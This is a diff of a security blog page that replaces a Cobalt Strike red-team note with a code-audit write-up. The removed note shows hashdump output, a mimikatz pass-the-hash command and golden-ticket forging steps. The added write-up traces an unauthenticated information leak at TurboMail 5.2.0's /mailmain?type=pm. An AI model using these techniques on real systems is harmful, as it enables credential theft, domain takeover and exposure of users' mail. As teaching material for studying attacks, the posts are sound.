@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【CS学习笔记】18、密码哈希散列设置信任, TeamsSix">
+    <meta name="keywords" content="【代码审计】敏感信息泄露, TeamsSix">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -29,7 +29,7 @@
 </script>
 
 
-    <title>【CS学习笔记】18、密码哈希散列设置信任 | TeamsSix</title>
+    <title>【代码审计】敏感信息泄露 | TeamsSix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -271,12 +271,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs18-1.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112151310177.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【CS学习笔记】18、密码哈希散列设置信任</h1>
+                    <h1 class="description center-align post-title">【代码审计】敏感信息泄露</h1>
                 </div>
             </div>
         </div>
@@ -392,16 +392,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                                <span class="chip bg-color">红队</span>
-                            </a>
-                        
                             <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                 <span class="chip bg-color">学习笔记</span>
                             </a>
                         
-                            <a href="/tags/Cobalt-Strike/">
-                                <span class="chip bg-color">Cobalt Strike</span>
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
                             </a>
                         
                     </div>
@@ -412,8 +408,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                CS 学习笔记
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
                             </a>
                         
                     </div>
@@ -425,28 +421,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-19
+                    2021-12-15
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-22
+                    2021-12-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    821
+                    476
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
 
@@ -469,105 +465,49 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>继续上一节密码哈希的部分，在上一节中讲到了使用密码生成用户的令牌，从而取得系统的信任，这一节将介绍使用密码的哈希值来取得系统的信任。</p>
-<h1 id="0x01-密码哈希"><a href="#0x01-密码哈希" class="headerlink" title="0x01 密码哈希"></a>0x01 密码哈希</h1><p>首先使用 <code>hashdump</code> 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> hashdump
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to dump hashes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 82501 bytes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received password hashes:
-Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
-Daniel:1000:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
-Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::
-TeamsSix:1002:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <p>这里以 TurboMail 5.2.0 里的敏感信息泄露漏洞作为学习。</p>
+<p>已知 TurboMail 5.2.0 的敏感信息泄露路径为 /mailmain?type=pm</p>
+<p>打开 TurboMail 的安装目录，在 turbomail\web\webapps\ROOT\WEB-INF 下找到 web.xml 文件，发现以下配置信息</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/mailmain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>          
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>turbomail.web.MailMain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>	 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>使用 <code>pth</code> 获取信任</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> pth TEAMSSIX\Administrator 12cb161bvca930994x00cbc0aczf06d1
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 23 bytes
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run mimikatz's sekurlsa::pth <span class="token operator">/</span>user:Administrator <span class="token operator">/</span>domain:TEAMSSIX <span class="token operator">/</span>ntlm:12cb161bvca930994x00cbc0aczf06d1 <span class="token operator">/</span>run:<span class="token string">"%COMSPEC% /c echo ade660d8dce > \\.\pipe\8d3e4c"</span> command
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 750600 bytes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 71 bytes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated NT AUTHORITY\SYSTEM
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
-user	: Administrator
-domain	: TEAMSSIX
-program	: C:\Windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">/</span>c <span class="token function">echo</span> ade660d8dce > \\<span class="token punctuation">.</span>\pipe\8d3e4c
-impers<span class="token punctuation">.</span>	: no
-NTLM	: 12cb161bvca930994x00cbc0aczf06d1
-  <span class="token punctuation">|</span>  PID  2992
-  <span class="token punctuation">|</span>  TID  5028
-  <span class="token punctuation">|</span>  LSA <span class="token keyword">Process</span> is now R<span class="token operator">/</span>W
-  <span class="token punctuation">|</span>  LUID 0 <span class="token punctuation">;</span> 14812112 <span class="token punctuation">(</span>00000000:00e203d0<span class="token punctuation">)</span>
-  \_ msv1_0   <span class="token operator">-</span> <span class="token keyword">data</span> <span class="token function">copy</span> @ 0000000001794E80 : OK <span class="token operator">!</span>
-  \_ kerberos <span class="token operator">-</span> <span class="token keyword">data</span> <span class="token function">copy</span> @ 000000000044A188
-   \_ aes256_hmac       <span class="token operator">-</span>> null             
-   \_ aes128_hmac       <span class="token operator">-</span>> null             
-   \_ rc4_hmac_nt       OK
-   \_ rc4_hmac_old      OK
-   \_ rc4_md4           OK
-   \_ rc4_hmac_nt_exp   OK
-   \_ rc4_hmac_old_exp  OK
-   \_ <span class="token operator">*</span>Password replace @ 00000000017DA1E8 <span class="token punctuation">(</span>16<span class="token punctuation">)</span> <span class="token operator">-</span>> null
+<p>从这些配置信息不难看出 /mailmain 路径对应的 servlet-name 是 mailmaini，而 mailmaini 对应的 servlet-class 是 turbomail.web.MailMain</p>
+<p>那么这里就需要找到 turbomail.web.MailMain 类进行分析，假设这个类是在 turbomail.jar 文件里，通过搜索在 /turbomail/web/webapps/ROOT/WEB-INF/lib/ 下找到 turbomail.jar 文件</p>
+<p>利用 jd-gui 或者 Intellij IDEA 对 turbomail.jar 进行反编译，可以在 turbomail/web/ 文件夹内找到 MailMain.java 文件，这说明之前的假设是正确的。</p>
+<p>在 195 行可以看到接收了 type 参数</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">195</span>  <span class="token class-name">String</span> type <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">196</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token number">197</span>      type <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token number">198</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 231 bytes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
-teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在 543 行可以看到如果 type 参数为 pm，则执行 PMAdmin 的 show 方法</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">543</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"pm"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token number">544</span>     <span class="token class-name">PMAdmin</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h1 id="0x02-Kerberos-票据"><a href="#0x02-Kerberos-票据" class="headerlink" title="0x02 Kerberos 票据"></a>0x02 Kerberos 票据</h1><p>关于 Kerberos 的介绍可以查看知乎上的一篇文章，比较形象生动，文章地址： <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p>
-<p>查看有哪些 Kerberos 票据</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查看该方法的代码，可以看到并没有对用户身份进行验证</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> bAjax<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">PMInterface</span> pm <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<p>除去 kerberos 票据</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">kerberos_ticket_purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> alPM<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        pm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PMInterface</span><span class="token punctuation">)</span>alPM<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>pm<span class="token punctuation">.</span><span class="token function">PM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token class-name">String</span> str <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">SysConts<span class="token punctuation">.</span>New_InCharSet</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>加载 kerberos 票据</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">kerberos_ticket_use <span class="token punctuation">[</span><span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span>file<span class="token punctuation">.</span>ticket<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h1 id="0x03-黄金票据"><a href="#0x03-黄金票据" class="headerlink" title="0x03 黄金票据"></a>0x03 黄金票据</h1><p>黄金票据 <code>Golden Ticket</code> 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。</p>
-<p><strong>使用 mimikatz 伪造黄金票据需要：</strong></p>
-<p><strong>1、目标的用户名及域名</strong></p>
-<p><strong>2、域的 SID 值</strong></p>
-<p>域的 SID 值即安全标识符 <code>Security Identifiers</code>，使用 <code>whoami /user</code> 命令可查看，注意不需要 SID 最后的一组数字。</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell whoami <span class="token operator">/</span>user
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: whoami <span class="token operator">/</span>user
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 43 bytes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
-
-用户信息
-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
-
-用户名        SID                                         
-============= ============================================
-teamssix\daniel S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>21<span class="token operator">-</span>5311978431<span class="token operator">-</span>183514165<span class="token operator">-</span>284342044<span class="token operator">-</span>1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 <code>S-1-5-21-5311978431-183514165-284342044</code></p>
-<p><strong>3、DC 中  KRBTGT  用户的 NTLM 哈希</strong></p>
-<p>DC 中  KRBTGT  用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行。</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> hashdump
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to dump hashes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 82501 bytes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received password hashes:
-Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::
-Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::
-daniel:1108:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>Cobalt Strike 在 <code>Access -&gt; Golden Ticket</code> 中可以打开生成黄金票据的界面。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs18-1.png"></p>
-<p>信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 <code>Fully Qualified Domain Name</code> ，也就是类似于 <code>teamssix.com</code> 的格式。</p>
-<p>此时可以通过 <code>shell dir \\host\C$</code> 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 203 bytes
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
-teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<p>因此直接访问 /mailmain?type=pm 就可以看到已登录的用户邮箱信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112151310177.png"></p>
+<p>这个地方除了泄露登录用户邮箱外，type 后面跟上不同的参数还会泄露邮箱用户列表以及对管理员密码重置等，读者可以自己尝试去发现发现。</p>
 <blockquote>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></p>
-<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
+<p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
@@ -596,7 +536,7 @@ teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span><
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/200419-150630.html">https://www.teamssix.com/200419-150630.html</a>
+                    <a href="https://www.teamssix.com/211225-131111.html">https://www.teamssix.com/211225-131111.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -634,16 +574,12 @@ teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span><
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                                    <span class="chip bg-color">红队</span>
-                                </a>
-                            
                                 <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                     <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
-                                <a href="/tags/Cobalt-Strike/">
-                                    <span class="chip bg-color">Cobalt Strike</span>
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
                                 </a>
                             
                         </div>
@@ -688,7 +624,7 @@ teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span><
         repo: 'Gitalk',
         owner: 'teamssix',
         admin: "teamssix",
-        id: '2020-04-19T15-06-30',
+        id: '2021-12-15T13-11-11',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -714,53 +650,51 @@ teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span><
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/200419-150637.html">
+                <a href="/211225-131111.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs19-2.png" class="responsive-img" alt="【CS学习笔记】19、代码执行的方式">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112151310177.png" class="responsive-img" alt="【代码审计】敏感信息泄露">
                         
-                        <span class="card-title">【CS学习笔记】19、代码执行的方式</span>
+                        <span class="card-title">【代码审计】敏感信息泄露</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            在内网中进行横向移动的一些笔记
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                        <span class="chip bg-color">红队</span>
-                    </a>
                     
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
                     </a>
                     
                 </div>
@@ -774,30 +708,30 @@ teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span><
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/200419-150622.html">
+                <a href="/211214-175948.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs17-1.png" class="responsive-img" alt="【CS学习笔记】17、登陆验证的难点">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112141758858.png" class="responsive-img" alt="【代码审计】JWT Token">
                         
-                        <span class="card-title">【CS学习笔记】17、登陆验证的难点</span>
+                        <span class="card-title">【代码审计】JWT Token</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            如果当前账号权限被系统认为是本地管理员权限，那么就可以执行很多管理员才能做的事，接下来就来看一下这样的一个过程是如何工作的
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
@@ -807,16 +741,12 @@ teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span><
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                        <span class="chip bg-color">红队</span>
-                    </a>
-                    
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
                     </a>
                     
                 </div>
